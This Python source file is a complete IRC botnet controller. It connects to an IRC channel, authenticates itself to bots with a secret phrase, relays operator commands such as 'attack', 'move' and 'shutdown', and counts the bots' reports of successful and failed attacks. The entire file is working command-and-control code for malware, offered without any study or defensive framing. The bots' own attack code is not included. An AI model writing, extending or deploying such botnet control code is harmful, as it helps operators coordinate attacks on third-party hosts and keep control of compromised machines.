# Authors: Rumen Kasabov, Michael Radke

# Controller program connects to a specified IRC server + channel. Then it prompts a user to enter commands.
# It is used for commanding bots.

import socket
import sys
import time
from random import randint


# Get the status of the bots in the channel
def get_status(irc_socket):

    bots = []

    try:
        status_message = irc_socket.recv(1024)
        status_message = status_message.decode("UTF-8")

        if "PRIVMSG" in status_message:

            # Split each line for when there is multiple bot responses
            status_message = status_message.split("\n")

            for bot in status_message:

                if "PING" in bot:

                    ping = bot.split()
                    pong_message = "PONG " + ping[1]
                    irc_socket.send(pong_message.encode("UTF-8"))

                else:

                    if "bot" in bot:

                        one_bot = bot.split()

                        # Get the name of the sender by splitting the prefix and getting the nickname excluding the
                        # rest of the information in the prefix (so nickname after : and before ! in
                        # ":examplenick!examplenick.foo.example.com)
                        sender_name = (one_bot[0].split("!"))[0][1:]

                        bots.append(sender_name)
        return bots

    except:

        return bots


# Get results from bots upon an attack on a host and print them to STDOUT
def print_attack_result(irc_socket):

    successful_attacks = 0
    failed_attacks = 0

    try:
        attack_message = irc_socket.recv(1024)
        attack_message = attack_message.decode("UTF-8")

        if "PRIVMSG" in attack_message:

            # Split each line for when there is multiple bot responses
            status_message = attack_message.split("\n")

            for bot in status_message:

                if "PING" in bot:

                    ping = bot.split()
                    pong_message = "PONG " + ping[1]
                    irc_socket.send(pong_message.encode("UTF-8"))

                else:

                    if "bot" in bot:
                        one_bot = bot.split()

                        # Get the name of the sender by splitting the prefix and getting the nickname excluding the
                        # rest of the information in the prefix (so nickname after : and before ! in
                        # ":examplenick!examplenick.foo.example.com)
                        sender_name = (one_bot[0].split("!"))[0][1:]

                        if "successful" in bot:
                            print(sender_name + ": " + "attack successful")
                            successful_attacks += 1

                        elif "failed" in bot:
                            print(sender_name + ": " + "attack failed")
                            failed_attacks += 1

        print("Total: " + str(successful_attacks) + " successful " + str(failed_attacks) + " unsuccessful")
    except:

        print("Total: 0 successful, 0 unsuccessful")


# Gets the results from a move the bots have performed and prints them to STDOUT
def print_move_result(irc_socket):

    # Arrays containing successfully moved bots and unsuccessfully moved bots
    success_bots = 0
    fail_bots = 0

    try:
        move_message = irc_socket.recv(1024)
        move_message = move_message.decode("UTF-8")

        if "PRIVMSG" in move_message:

            # Split each line for when there is multiple bot responses
            status_message = move_message.split("\n")

            for bot in status_message:

                if "PING" in bot:

                    ping = bot.split()
                    pong_message = "PONG " + ping[1]
                    irc_socket.send(pong_message.encode("UTF-8"))

                else:

                    if "successful" in bot:
                        success_bots += 1

                    elif "failure" in bot:
                        fail_bots += 1

        print("Number of bots succesfully moved: " + str(success_bots))
        print("Number of bots unsuccessfully moved: " + str(fail_bots))


    except Exception as e:

        print("0 bots moved.")


# Gets responses from bots upon shutdown of those bots
def get_shutdown_result(irc_socket):

    bots = []

    try:
        shutdown_message = irc_socket.recv(1024)
        shutdown_message = shutdown_message.decode("UTF-8")

        if "EOT" in shutdown_message:

            # Split each line for when there is multiple bot responses
            status_message = shutdown_message.split("\n")

            for bot in status_message:

                if "PING" in bot:

                    ping = bot.split()
                    pong_message = "PONG " + ping[1]
                    irc_socket.send(pong_message.encode("UTF-8"))

                else:

                    if "bot" in bot:
                        one_bot = bot.split()

                        # Get the name of the sender by splitting the prefix and getting the nickname excluding the
                        # rest of the information in the prefix (so nickname after : and before ! in
                        # ":examplenick!examplenick.foo.example.com)
                        sender_name = (one_bot[0].split("!"))[0][1:]

                        bots.append(sender_name)
        return bots

    except:

        return bots


# Send a private message to the channel upon a detected command
def send_message(irc_socket, channel_name, message):

    private_message = "PRIVMSG " + channel_name + " :" + message + "\r\n"
    irc_socket.send(private_message.encode("UTF-8"))


# Generates nickname for the controller
def nickname_generator():

    main_name = "conbot"

    # Generates a random number from 0 to 999999 to be assigned to the controller
    random_number = randint(0, 999999)

    nickname = main_name + str(random_number)

    return nickname


if __name__ == '__main__':

    # Check that correct number of command line arguments have been provided
    if len(sys.argv) != 5:
        print("Wrong number of command line arguments provided\n")

        # If 5 command line arguments not provided, throw usage error
        print("USAGE: python3 conbot.py <hostname> <port> <channel> <secret phrase>")

        quit()

    hostname = sys.argv[1]
    port = sys.argv[2]
    channel = sys.argv[3]
    secret_phrase = sys.argv[4]
    command = ""

    irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Get a random nickname
    nickname = nickname_generator()

    try:

        # Connect to IRC server + channel
        irc_socket.connect((hostname, int(port)))

        irc_socket.send(("NICK " + nickname + "\r\n").encode("UTF-8"))

        # Specify username and join the channel
        irc_socket.send(("USER " + nickname + " 0 " + " * " + " :" + "I am " + nickname + "\r\n").encode("UTF-8"))

        irc_socket.send(("JOIN " + channel + "\r\n").encode("UTF-8"))

        # Receive reply from irc server
        message = irc_socket.recv(1024)

        message = message.decode("UTF-8")

        # If IRC 433 error - nickname in use, we try a different a nickname
        while "433" in message:
            nickname = nickname_generator()

            irc_socket.send(("NICK " + nickname + "\r\n").encode("UTF-8"))

            # Specify username and join the channel
            irc_socket.send(
                ("USER " + nickname + " 0 " + " * " + " :" + "I am " + nickname + "\r\n").encode("UTF-8"))
            irc_socket.send(("JOIN " + channel + "\r\n").encode("UTF-8"))

            # Receive reply from irc server
            message = irc_socket.recv(1024)
            message = message.decode("UTF-8")

        print("Controller is now running. Connected with nick: " + nickname)

        # Set timeout so that receive doesn't wait more than two seconds for when there is no immediate input from IRC
        irc_socket.settimeout(2)

    except Exception as e:

        print("Controller could not connect to the IRC server.")

    while 1:

        try:

            # Send secret phrase (authenticate after each prompt in case new bots joined channel)
            send_message(irc_socket, channel, secret_phrase)

            # Prompt the user of the controller to enter a command.
            command = input("Enter a command: ")

            # If command is quit, exit the controller program
            if command.lower() == "quit":

                # Close socket and exit program
                irc_socket.close()
                break

            send_message(irc_socket, channel, command)

            # Wait 3 seconds before receiving bot input (so as to not receive too quick)
            time.sleep(3)

            # Get status result if command issued was status
            if command == "status":

                # Contains number of bots found
                status_bots = None
                status_bots = get_status(irc_socket)

                if len(status_bots) == 0:
                    print("Found 0 bots.")

                # Print status for each bot found in channel
                else:

                    botters = ""
                    for bot in status_bots:
                        botters = bot + " " + botters

                    print("Found " + str(len(status_bots)) + " bots: " + botters)

            # Get results if attack performed
            elif "attack" in command:

                print_attack_result(irc_socket)

            # Get results if move performed
            elif "move" in command:

                print_move_result(irc_socket)

            # Get shutdown results for when bots are commanded to shut off
            elif command == "shutdown":

                shutdown_bots = None
                shutdown_bots = get_shutdown_result(irc_socket)

                if len(shutdown_bots) == 0:
                    print("Total: 0 bots shut down.")

                else:

                    for bot in shutdown_bots:
                        print(bot + ": shutting down.")

                    print("Total: " + str(len(shutdown_bots)) + " bots shut down.")

            # If not a bot command we receive from server, if nothing receive we get timeout, otherwise we handle
            # PING PONG
            else:

                # Receive reply from irc server
                message = irc_socket.recv(1024)

                # Decode message
                message = message.decode("UTF-8")

                if "PING" in message:

                    message = message.split()
                    pong_message = "PONG " + message[1]
                    irc_socket.send(pong_message.encode("UTF-8"))

        # Timeout on receive (for when no reply from bots)
        except Exception as e:

            if str(e) == "timed out":
                print("No reply from bots.")


